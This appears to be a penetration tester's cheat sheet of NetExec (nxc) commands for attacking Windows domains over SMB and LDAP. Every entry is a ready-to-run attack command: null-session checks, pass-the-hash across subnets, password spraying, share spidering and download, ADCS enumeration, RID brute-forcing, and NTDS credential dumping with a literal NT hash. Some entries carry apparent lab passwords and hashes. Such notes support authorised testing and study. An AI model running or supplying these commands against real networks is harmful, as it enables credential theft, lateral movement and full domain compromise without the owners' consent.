- Check : 
```bash
# Target format
netexec smb ms.evilcorp.org
netexec smb 192.168.1.0 192.168.0.2
```

- Null session : 
```bash
# Null session
netexec smb 192.168.10.1 -u "" up ""
```
- Pass the hash : 
```bash
# Pass the hash against a subnet
netexec smb 172.16.157.0/24 -u administrator -H 'LMHASH:NTHASH' --local-auth
netexec smb 172.16.157.0/24 -u administrator -H 'NTHASH'
```
- Enum smb shared folder : 
```sh
netexec smb $t2 -u 'rsmith' -p 'IHateEric2' --shares
```
- Password spraying : 
```sh
netexec smb $t -u user.txt -p user.txt --no-bruteforce --continue-on-success
netexec ldap $t -u usernames.txt -p 'BabyStart123!' --local-auth
```

- Download Share : 
```sh
netexec smb 10.10.65.99 -u "trainee" -p "trainee" -M spider_plus -o DOWNLOAD_FLAG=True~
```

- Certificate : 
```sh
nxc ldap 10.10.137.165 -u 'peter.turner' -p 'b0cwR+G4Dzl_rw' -M adcs
nxc ldap 10.10.137.165 -u 'peter.turner' -p 'b0cwR+G4Dzl_rw' -M adcs -o SERVER=hybrid-DC01-CA
```

- Credential dumping
```sh
nxc smb 10.10.137.165 -u Administrator -H '60701e8543c9f6db1a2af3217386d3dc' --ntds
```

- Check if there is an AV : 
```sh
nxc smb <ip> -u user -p pass -M enum_av
```

- Password Policy
```sh
nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --pass-pol
```

- Brute force Rid (Other way to enumerate users )
```sh
nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --rid-brute
```

- Check MAQ :
```sh
nxc ldap $DOMAIN_CONTROLLER -d $DOMAIN -u $USER -p $PASSWORD -M maq
```
